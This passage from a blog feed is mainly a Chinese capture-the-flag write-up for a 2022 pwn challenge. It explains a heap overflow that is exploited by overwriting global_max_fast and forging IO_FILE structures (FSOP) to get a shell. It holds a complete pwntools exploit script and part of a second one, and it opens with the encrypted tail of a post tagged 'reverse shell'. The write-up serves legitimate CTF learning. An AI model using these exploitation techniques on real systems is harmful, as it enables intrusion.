370ab9020e1e744a70b0abe9a3d02f24f95a1d115cec0c27610a8c7a8319ae86cd4b823b2ca8c3a8e2f0f485dc8e0025fa9ce1cc9bc265f173095acbe05beeaf1d3b964119a8445afc0e72694d6ffde8b3f47d42a15d26810a1429e660963721afe857e862655d582dde2d31c9be9273c7328674c8077573fac8fd3e33f8a7d3f3430b9ca8d8e73825aaf941b0ae9b39f37bf3e7f37e5713b4b0147430e1ea3759d7bc2c6307f457ac174b30fe5489b086d933d128f4c1ce77ed6a980297c48a563bc632f5aaa4528d821678fadb3ddb7dfb10d5369cf578c0b88f7d28c3cbb525b520f6467f4588ab6d5757a875fdd8f37f149767402ee524652f175ed1ce152605b7b590790a5371f25dc2e97d12eb43a1d1ef50580e059a819988b9905dd2ea3696bf24fd5c8dd6ec4e151771f2d776322210ecd5ef632a206e9c73eb58043f8c3bef205fee91f1b81b0801788fb40fbd6e8cbec2574d070bb06f728e839c3a992b4f7c2d827caf8b1f1491457d17de29d33cc625040683146c5dbc361f9e5b962853f35dba8381f9ad271500444d8d7bf31e4a3d975fe1fe738e7827c21dca505824806318ffe87545c8282c223f5ea43a5e987a37961d15190f4b40294dcd01b85a946a63da535809d2684ad5bf90285a2e5958a058c2cc87a268047b05d6656cef6d4f52e566401771da49e489586cd6e15e6d84357b3241b8b205496ae1ae2d78fba509c4d8c49d30040be707b017f6f1a19d237222ceec70535261f84e1273561fa8a8256a6766f8465d8d33779bffdac5c09f34c73f061ad484f879b18da4c222e9db7879a5fe62ed15cbc06d24937820b1d22d12b79e36435b77dfb702c4dcc71cca234a6b04d92694de5f9eef5dd22f9cb76172c48b4af3a2765c6e401d72db1fe33f9a30032ecbcd92b5491b0d6a2895e274a93eab5da87d76a106f59adf793e3c873fcfc55f73c4855a745ed559bbcd1d3d2ef87d1ec0f6b51f07c2b578b324367914c0e41174e3ac612bfac9f99c5097f14434ba65d8e845b6b56175e3b785fd554d46714beebc509ab4c26012e1e438f22e67a2abefdc29bf4dd07e116957051d5f1d471f07d01169c4639ad1a146b7fec0875fae3f1baee2b95835d2bc28123f86c22f465e2b92702d68dde83e73f4192481c6f6ae1411065eacf522be4ba24baebddaa75f270a9dd559f32bccd57c78e832aa626b5893955e317fb12392402966aec5247a68602469f57fd81e951b66f3bc4c584369a5bbfbcd82bcb244be6ef9a3947dda3c5e373062eb39d1c3ec990e0d58f17f4b8704b571bb850553497bd3ed48e96c6a29ef019fb5c2dd797ef4f2bc3a7de25531ac0451338c8ce513a7fdf67cd532077a6a21265a5a0417bea032b63b576965b5f67ca3909be3d1b2c1a38f26d515ee3311b696d897b9bcfec76800ca23f3d6b5ae878daba9c5b69e25905df2fe259bb42c8cb8d07443a4911678712fcf80729f9a05e197fa47ecbb1317c6eca4dff82263a18662799bbd2df807243672bc09a80f405bf3cc251f8e9120835ed298ab1cb036910477eae79e862076566b2c9b679c03e36b2ddb632a4f24c559398b3162aa302b303330d4b0fd99215dfb2de1855062a18b9315ed6e23aa3e0086d54873e0343a978ed67bd7c01a93c22de39f5f5a7d2805ffac8a2d8445c3ee794a02895f2d281989954129fa776edf431df047a7e2eb94573e18c3c102f9795ea307c09c5aef22752f09e2e10af9b39291819a2a6531fbd18fa5f2de026a241b1132353344b27da812f1debf1c030fa67872272eb228286481dc5bea767dd284c4093d5d59c6f9495617455537fd46e69cf255d81d869d3d5ee0cafc4ea67571880479f3d558d3ea7b32b5bba91462cd1a1bf3f21d0cdac8e7b1213f05a9b96bb8da7b599942497731397bc57cbb0e5f7bc28e52e88cf1dd497acc6db7184c1278298c669b622c7c10ad4713602373e103588da9c6e5433e1355c651485e94378b27149982d05ce30c6513610339f67a20b97c56658e0ff9f1a201e6dbefd83e7267a5a93284217c58716368fdff78517788de7ca04bf977591fbe9aacacafa43c350deb1e9d5e6d86bf7fb6430a0722385f06055800250f278b0e48dda90c780a3734d6e31fa90b23d3418426afc1db74cb06da0de18122781637ebf6bf220346cb79017cba13c42b4da1871381b0a40c93c696c3fac35a0c1e6106aeebf35d253b14f732fff449a3ca0ea205da373b6948e74f3869a1fc29536e49c1d92ecb3e9bc93f95a7dcdda301ba9ae55a87f108b93e0958d283842284b584cff2d589fe0022538436169bbe4c151397cd951f4c9b223173797280b2f91edaedd5139230a2cba084d41fe5f66165c23d775b8fe10edd2f7399c2711d30268c8b2c23c0445ff9760e308e6cfcf9a337baa79f31c72fff98d64098786f34b696d3dc331fccc86db105c3ba8b481743a8a788570fc44bc94066b98656b1007fd6f5feb725726284aed4985d064197c5ae688efe2d211d9944956ee0c86c8935797813237aea16f590fd6c4bc493b0666ef47ccb2c726be71c983ae06141f4d6f4e4cfe497dfba55822657d53001096daa2b19ac2c57353e5f868872857ce48d0484e2bca9cf5a94ee2995dd36acf6f8e68c43df4e61be8b6bc18c3f29397f64d10f52163d4cc73b2826b3b78577e0559b3bd27ecfbce1cec56272cd4a5cf32d75c9cb70e3e47e7376da6cd772b1cb564fddb8c03f6aa1cc862b98e17eb9217bdd9d8a4f4d43e29296e10761bb167fc0e2132122980d53ffe88632435e4b4681de874795354394ba029ebfc06cd615c8eedbdd70ed789d08eb2f7c7519fec5c1352e7ccc3126969b674de8d7a7ed811d0f6bec55b6e360d39a938a81ea37a120989fbc5375d7a654fddbf629f6cb7d499b797d703c9f3aa6903cf1dda2df5bf35f113a1738f436f0448d7899741d0f9f908a37d72de63c1dea814ee845f1b22520c8cceb9bda245247a308b8ad4b23c05e7282c36b16390bf17862786044f00633041d86ec37f0afd23765fd656cd638337ed49f97721160b6848bd6d5039841d2c1bd87574cfebd000f4b8c0d2c2e59b66fcb2d1428a7239de4cd45a64e5589c47cf15f3a7a5516a082622989a2ae6504a322f02d5ff5a9ee708434b91a015b8446204338dc4bcb4fb22ad9888612fb730b19f7d1406b5dec3f78770e7ddcbd160928de028e8c9e298d054fd445a5788b6b45e0193159df48f02ebf86ae58fcc5bee84637257fdaaf64916546b8387729704eda08b262e5091c99ed24b0575d7699416780021ff06292a33957c0a30c000b05996d1b5f56bfe648e42bf57ec0d8f41f111170be235c0d722be1f87aa3dde5178147d323e1f09669cf8f97223ea6a7a829ca4b03c06303ce190ebbc511690ec609f49062db08551c68cd2b1dda8ccbc97a1a98b8d887a306302418fd88a60e2ac2853a209217a3cdf50355cc36f3e7fcc9944bb353d85620e65f4869c0c7b19a9a8bebae6976182f3d77f58f1b5277483ba97452c41079cc570103d0b12788f8eeab8c47f4d8f0c96e11892e4c22ab3d76e5fc0a4eee4c8f0f6979652211af28eed0a0990e72f0799e4d1a30c7d45238725adcf4da20c25b4fba3567cc9597a9058e502db6dfbb3b1b663aa1000cc1e10b7c4f8809901c77ad833d06c1a5e84a96216d530969eafeb7a8289b761ccfe1f0ae75e5c9016d62c41a0620e7cadb2704bffe2a1eb40d959f78bee55531dd356273fcd7033636ad8513457e0036c34ee66433ac673e0f2f53808edba4862060e625f39c24ede29517d5ce6b282d12812ead29a41e398b200e0d35c09a8bf29692ee6a69ee9c1d9c9b4602b97a997bee11bb83e25152e8187db7e1896aaaa73d760fdf4185053895a8683356d96b5775008678b64180c5d0133dd6baed131aa5acac6704043c139498fa8ef271cfd1af3553112c55898addbf22afcc8a900fc89a50d5218c8efac71218d838616ab2363c1b48eded5a770c9a86da6810b0c6ee46f833eb3554dd3e0565a991d1ffe71910c0c77ea1ce41467c957fbf509aa10937f2d9fba1db322b208b1093873ae17703736ee522f987030071bb6ee9b43a828b2b4cc997164c984ea6850c1969db1a8c2bd67d0cb65608adcbb3a1523fef8a6ae73269ebac29a557c855c1993ea4392d800b777c0980f03b3f5976ac0d96afa26eb9ef22cbc2e3e88486f63f76fb11c7873fa75274a0ca3a50f3b9ceda49c09084f7d07496e4ffb5bc6e5699e5ce8e2fc5750d4e4d4868b6ef2738e4c5f4f3831faab49b868825e6e480edde49cd5aefb037b98a482002c3247cd6bad9e9e4961c44fe92dbda131bd4e468de4c224c3905a278d4175d2c857e6c09129e5e41928d5e1f6ddc70315595b383dad9ad92147357957579b5e669b714154221e70bbb585514867433ac9aeb4deef8fbc079f7485613a83ced041f5a26ede8948c139020bc88a51bfbe8ddc6823ac20c08907246698ad66c8ec49340def112b3da6e6f092b28fee4f53873335f4f318f592580a75be1960eda64099c0095c85f651039a71d0d7eb744350a9a38e0fe5efb9d75225d7519be4c19de3492696b848ce5bf7f1db314dc74a96c742736ce8646924ad1112bfb21e38b1068f1f44252149f37737e5e6507172f3119927a6c0dbf68e69dfd7ba362377c04ddbcbf7b28e5fc48c43dcb030471aef4833fad6a0c455c06ab4ed34d8377b63939d0ec07582d06ea0fa91241c327f5d5644a6044a55cbdb831f1037af014047f2e0073e96f142925f3f46866245e40053ca6b2e7a6744471195a0c00eaef479bb2b0eecf93e046d0f463dcedeef9df5a23a3c207d74dd42aa0affade47346529b717259c4302d6a8147d6133c4d4d07b6fa62fbb35ec71f838c23ef4ae6e7a510f847d75ee0f8a78863847df407a4143dfc44fd82e3061fbe009b898cfababad711efaa496cce74fb69fd5edc2720c58f2acb7272195b0ffa1506ced7bc222b9370e2e2a554ec88add9dfc2874956db02b7746eb69e9ba967f9e17cdcc0dbb8063ceda88e22bb2be6f1869ee45bfe28ce3065825101a46f14b8b9fbdbe30184c98313a926bb3b12f58d31c269fa610637aa9e3a1a3ae3dff2c5f0791161f7cc5d22ecea4772a54db4234fef785052622b121b2e3740a30a1607b64584dd1ab1d5db040480a1c548d04704f3e36c7a0fbd4f60a1c5ac06525ba204eb1e12735dedbc55e03e8b635f5c984145669c808f404efb1f36b86c2a5e438f797ffc30c6eb33537bf38efb775dd6218f241ce3c748ab2e0a0c5f7887cb2946e63c6f8687f2e1b23519084ca80d4e2ae3808b7c005a8eceacc9eee819b3a1ae43946c83e801d78c96d629f8753884750734a40e5180e322d9a2c720b04dc8bdaa6a8683fe9f3c304eb013a659cc86350cfbed476660050ea472b09ce8e98a21824277ac1ab819eda11f003c45cd6cf3c6211047539c5330bcfc289b9b9f0a88e2663dd83d4c21369f448583763ea9157a3bb1682547ebbf7c8b993f2b86ab75891261faeb04bc9f24bc90ee24dc1650b96411fabeb2e135f18cd67d1136e62fe293d78d020f468f45ca4e79aa8c561728bc1ef25ab9f953a79288324df2e4e446a27201598261b28994fb2fd157a53ab3abf6f34227b84353fefe8ada3fa5e87bb785c4e8e53fa6dd010d30f073bfd013c3ceed04d5cce2c8e83e8a9829e0517adb9fa0fb74e68c685f6faa60e624b19dce2382c6f306cc397ca18c907f3c75469cbbcfd20ce9d35c37cd104fd343eb72b939bc07961d917e8b5fe0ff5f0e0b40411dac8b49fe21caef197acebe930ccd001cb9580c3fc6e3bd788b9efa11bcf9827001b42adb838adbd1e514a43f89e9d8e473c345badfe3a3222bef3859692e23c874db76b9b9a4250902298baeae8c42d920645fc833891a0c9116c49541b2dfa4837100f236fe5cb892d25fdd9948182991381603679bbd6d2b0b7c91914378209cd23d3bfd9f7df940b6fff5fd77d89875c6c2904ffd228f69ea86ffa8820ebde60f1a91ec24c658dd4e03746f570dedfa9ad0311153ba8bb57b068428f9a8fe9849f4f4a5f701d0fd30ebc7bd700be4945a366ed9dc93d13a90a340dd5e504c2b24696f496218901dffc7a88b90c1c9aaa6c84d2df1e673213403814057d7a78dfc414290b62360e050b87ba8e4e08690feaeb3864ae9f548da4ae53bc83e40e6a9cc6d93efab287de03005d97ac162cc7c8dd8e167908d1f414127d2e1e6f5fbf281898d6a9a72f663e872dcf968fe7e6c13a214d78ae088cf669a4deb8f673c7fa33ac52c01d39719bfe4f39c8160fb38fe773f9ba652f525bf28000f50d266fac0683335c6840fe200acad73264b74fec36dadf21db4655ef864008485d4f8cc49edccf6574b3eccd21eb5b859bec9a13db1027a77aaae6680a1be8ecc2006510a21883df5f12a265ce5cbd5a51836604dde390c610b946ac2dbdb3154bef671739b2f135226e78ba59a461b655003b86879d4a14771e03246bdecf5483aad28a490190ba7a113b7747f6bf6143af1103c3526c9aca91ea5467fd149358babff0489f0da9d9840c38117595b384f9a661044d96a1dea51853d159d367f8fe761459472b768f8e5f88ff229791e48e70800405f00e0939a3bb10fa44d831320fdccb0efa590ed6465b93dcc07c347af4d48f21c60b1fd47cad67c60f642d2aab03b5d8968a183b3024e1fb65651a26ca4fb23f43eca294526a78e07cce0285a230988ae06cc6f6ddd1c0ab497bfb15319a4f6a42a0c08ba1a0e014cd7fb522bfdb84022b15e339adbf05462ffa9cadb9a69c8f0479e96cf7f32b4f05aacfaaa4580c54634b37d77098e9f629736c2b9bbb308c8da2e5aff7592b96444401ac09f4c37bba8648d9c21b23af9110776788dfc7429eb4b10a3991b334dfd84144626e71e5f195c1317d0af476d216a61b6f6c0993690732e63b4586cc998761f7a27058a52576ed86e29712664e88b919f76dfa0141fc9fdf5cf94cbf78a31cf9b7484e30d733502a50ab3d9ea360ba942766f012d7fb777de7df23103f7051a0eb4336a4814df873ded782136b8c027d4b1a46843ca911ce66fc0916e3551d86823039ad2223205ec25c9a5e48fef6aad09e3b987bff0cb5333123c9b54a0faf124329156b6128b84ce46ed109a30b17b1d87adac6acb144bc3359feacf506a5d669c5988d8f1c2dc5150a7acebb781e9b0abebdeec02efaf6dd1611af6ac5356e44f8fc8a544dea3b1a57f46a621e742f5e54866b09f74d8ed52d99b6884143684bc4b69ef716181b7941c3753bf34d33e26090c63fe2bca1877afdae7519223d94e25946d7090576b6753e076d0e8b0ebef9d618e660c49f297fb3938114a8245cfc218ddc946653f6b8b8301ca3577ae851cf97602a7c169152f8cd3baed89df9fe1b1f983543c4463d088f56546a6b6d4c984eb06fca355c2319c5cbf2c9877fbd0de2cc22f503fe8f0563e3347b985301adcaf1cc34b6afed89d3f8d302591842558644086fd6f5f0890af4eb69da2048463cbd9d0e61fb14ae264e4e0c2284029d3aa29a5ad41c90dabfede7523a19bdefe4cbbbcf2b298dc02ba5e2f29c49ec345221b3d17784318ad5fba21169bdfcb0ee3db7967b1b03027761d6c6def77110e85cd6cccae55a2406baf5978fd292d2e9d77afedfa19b950f92e4e04052c6c7039beb2043c839231b0fa26caf47ad662cf72b7e906920c51d0c4354977979a8b4dec1dd08c91904c5c8b26b375674f282d384fb728ebcf8e24196411ee62b8bf9af6bb3711aa90794a3efd791528853b0926a4547b327cb57d1f08fea985666a18d5a4c53c97ecce46a37a6b891617e2bdd3d42b5ba52ab0b4d2b38f379f9a47c6d88d13b6fdfb1364444683e1d6a73be8a28222c82bfe7da9ff0edc8acded4223ee2cbf2208b58a2afec4827a52fa988fe91df9e8b35fac56280a60b853d5c99fdbcb74efe3f7de804b9f77ca93969910e73fcfa40134586422c014b8986c64831fb2151c0c0492d8bddb59a4c600fba652fea271e5f1d8362695e8068e427ae877a46d0e27512c160a2d491d911a2f9bf01ce01cf9a496e10af40e78178ec4766c4ce4c7dd81f1f7a2bf852e68b96724cf837216a9834a1636d12a7ffce7a095f1aaab3d009cc34c495c43eb5b0650777cbee1a6d7c071918b9f91ab88b802bfcbcec286b45f617124028e3220522b66b652180c711bfc4adf762b2f144650735be683454aa3573e5ae47e83b5ee4ad9b9ddb43c7f6f73f55a10f04abc2260192fa83f7a0fd9be043016428c8f939dc42a689fde31b075f769d3f4d3477cce25c3dfe5108f41af5d93541fc944c4693fbb4769242e6761c421d1dd7bfa2e113bd67d2c197031054e518a5fdbbd6f35691c1b312ca4c85a33aeb9b2106de13c4507d166d40383662b557e7aee40a4ca49110b748586b1a5aa72d61089c2772b5fea40fd9e47af57e79be2a1aeddea5e5ca9a5f073f06fe332cde17d1f67091f23ecfa6b1a784c1f04594d2d85a65d72204e720438e2ccbe4ba6f905fdc5ef4d9147cb580e717e07d1a084d8e5ad85dc2b4ee5666ad765ed11492d6eecf5bf2cab1f498f0a1699</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 私房菜 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lab </tag>
            
            <tag> trick </tag>
            
            <tag> 爆破canary </tag>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-长城杯-铁人三项赛 pwn wp</title>
      <link href="/posts/62896955.html"/>
      <url>/posts/62896955.html</url>
      
        <content type="html"><![CDATA[<p>题确实不难，但确实比赛没写出来，可惜差了一点，要是再给半个小时或者一个小时应该就出了，最后卡在一个奇奇怪怪的点（就是 <code>global_max_fast</code> 为了避免写进去 <code>0xdeadbeef</code> 有点大，就用了 <code>global_max_fast - 1</code> 这个地址写入的，结果不知道为啥后面 <code>free</code> 掉堆块后，里面的数据直接没了）浪费了很多时间</p><h3 id="保护策略：">保护策略：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301102012422.png" alt="image-20230110201221051"></p><h3 id="漏洞分析：">漏洞分析：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301102014013.png" alt="image-20230110201433955"></p><p>这里可以泄露程序基地址，但是在这道题里没有什么用。</p><p>在 <code>add</code> 函数中，向堆块里写入数据的时候，没有用 <code>\x00</code> 来截断，同时可以 <code>malloc</code> 的 <code>size</code> 范围比较大，可以让堆块进入 <code>large bin</code> 中，因此这里的漏洞可以泄露 <code>libc</code> 和 <code>heap</code> 地址。</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301102015283.png" alt="image-20230110201520208"></p><p>在 <code>edit</code> 函数中存在数组溢出，此处的 <code>buf</code> 数组为 <code>__int64</code> 的类型（八字节），所以 <code>buf</code> 的数组实际只有 <code>0x20</code> 个字节，因此可以溢出八个字节控制 <code>v2</code> ，而 <code>*v2=0xdeadbeef</code> 就相当于任意地址（因为 <code>v2</code> 可控）写入一个 <code>0xdeadbeef</code> 。</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301102017087.png" alt="image-20230110201742011"></p><h3 id="利用思路：">利用思路：</h3><p>很明显 <code>0xdeadbeef</code> 本身没有任何意义，因此考虑这里是让我们改大某处地址里存放的数据，首先想到的就是更改 <code>global max fast</code> 为 <code>0xdeadbeef</code> ，这样就可以在任意一个 <code>libc</code> 地址里写入一个 <code>heap</code> 地址。而此处比赛的时候想到的攻击是劫持 <code>vtable</code> 或者劫持 <code>IO_FILE</code> ，不过想了一会发现还是只能劫持 <code>IO_FILE</code> （应该是没法控制 <code>flags</code> 字段的）</p><p>然后打 <code>FSOP</code> ，这里有两种思路，第一个是伪造两次 <code>IO_FILE</code> ，让第一个伪造的 <code>IO_FILE</code> 的<code>_chain</code> 字段指向第二个 <code>IO_FILE</code> ，因为当时考虑的是第一个 <code>IO_FILE</code> 的 <code>flags</code> 字段没法控制，于是还得再伪造一个 <code>IO_FILE</code> （但事实是，这里的 <code> flags</code>可以控制的）</p><h4 id="方法一：">方法一：</h4><p>这里说一下伪造两个 <code>IO_FILE</code> 需要伪造的字段。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br></pre></td></tr></table></figure><p>在第一个结构体中，我们不希望执行 <code>_IO_OVERFLOW</code> 因此，要让前面的检查不通过。而前面的条件又由一个 <code>||</code> 连接，因此需要第一个条件和第二个条件全部不成立才可以。</p><p>这里伪造的字段为 <code>fp-&gt;_mode == 0</code> <code>fp-&gt;_IO_write_ptr== fp-&gt;_IO_write_base==0</code></p><p>这样前后两个条件全部无法成立，自然无法调用 <code>_IO_OVERFLOW</code></p><p>在伪造字段绕过 <code>if</code> 的同时，不要忘记设置好 <code>_chain</code> 字段，让其指向第二个结构体。</p><p>在第二个结构体中，我们希望执行 <code>_IO_OVERFLOW</code>  ，因此要将 <code>fp-&gt;_mode == 0</code> <code>fp-&gt;_IO_write_ptr ==1</code> <code>fp-&gt;_IO_write_base == 0</code> ,这样即可触发 <code>_IO_OVERFLOW</code> 。在这之前只需要伪造好第二个结构体的 <code>flags</code> 字段和 <code>vtable</code> 中的 <code>overflow</code> 让其指向 <code>system</code> 的地址即可获取 <code>shell</code></p><h4 id="方法二：">方法二：</h4><p>第二个方法就是只伪造第一个结构体，因为我们是可以控制 <code>vtable</code> 的，而作为参数的 <code>flags</code> 字段位于堆块的 <code>prev_size</code> 上，在上一个堆块处于使用状态时， <code>prev_size</code> 是作为上一个堆块的用户区域，所以这个字段也是可控的，只需要让上一个堆块申请为 <code>size</code> 以 <code>8</code> 结尾的即可。最后用 <code>/bin/sh\x00</code> 填满堆块，从而控制了结构体中的 <code>flags</code> 字段。别忘记伪造字段来触发 <code>_IO_OVERFLOW</code></p><p>这里简单说一下篡改<code>  global_max_fast</code> ，最终效果是可以在一个高于 <code>fastbinY</code> 的地址处写一个堆地址（这个的攻击本质就是数组溢出，后续利用通常是攻击IO），但还有一个条件是对申请的堆块的 <code>size</code> 不能限制的太小，如果索引太小的话无法修改到我们期望的目的地址。然后利用过程是先申请一个精心构造好 <code>size</code> 的堆块，接着篡改 <code>global_max_fast</code> （这里顺序不要弄反），再将刚刚申请的堆块释放，即可触发攻击，向一个 <code>libc</code> 地址中写入刚刚申请的堆地址。</p><p>该手法利用的关键在于 <code>size</code> 如何计算  具体的话请参考 我的这篇<a href="https://zikh26.github.io/posts/30a1c326.html#%E7%AF%A1%E6%94%B9global-max-fast">文章</a></p><h3 id="EXP">EXP</h3><p>这里俩exp都放一下吧,整体思路都差不多其实。下面这个是伪造一个结构体的exp</p><p><a href="https://zikh26.github.io/posts/ad411136.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">d_a=<span class="number">0xDC1</span></span><br><span class="line">d_d=<span class="number">0xdd9</span></span><br><span class="line">d_e=<span class="number">0xDCD</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content length:\n&quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">&quot;ontent:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Comment:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content id:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x108</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)<span class="comment">#leak libc address</span></span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3c4b78</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x1008</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="built_in">int</span>(<span class="number">0x1008</span>/<span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x100</span>,p64(<span class="number">0xdeadbeefdeadbeef</span>)*<span class="number">2</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)<span class="comment">#leak heap address</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fastbin_ptr=libc_base+<span class="number">0x3c4b28</span></span><br><span class="line">global_max_fast=libc_base+<span class="number">0x3c67f8</span></span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">chain=libc_base+<span class="number">0x3c5688</span></span><br><span class="line">vtable_addr=libc_base+<span class="number">0x3c56f8</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">index=(chain-<span class="number">8</span>-fastbin_ptr)/<span class="number">8</span></span><br><span class="line">size=index*<span class="number">0x10</span>+<span class="number">0x20</span></span><br><span class="line">log_info(<span class="built_in">hex</span>(<span class="built_in">int</span>(size)))</span><br><span class="line"></span><br><span class="line">add(<span class="built_in">int</span>(size),p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)*<span class="number">13</span>+p64(heap_addr+<span class="number">0x1710</span>)+p64 (sys_addr)*<span class="number">4</span>)<span class="comment">#伪造的结构体</span></span><br><span class="line">edit(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(global_max_fast))</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_d,d_e,<span class="number">0xCF1</span>,<span class="number">0xDE5</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面这个exp是俩结构体的，比赛的时候写的是这个，代码比较烂</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">d_a=<span class="number">0xDC1</span></span><br><span class="line">d_d=<span class="number">0xdd9</span></span><br><span class="line">d_e=<span class="number">0xDCD</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content length:\n&quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">&quot;ontent:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Comment:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content id:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3c4b78</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span 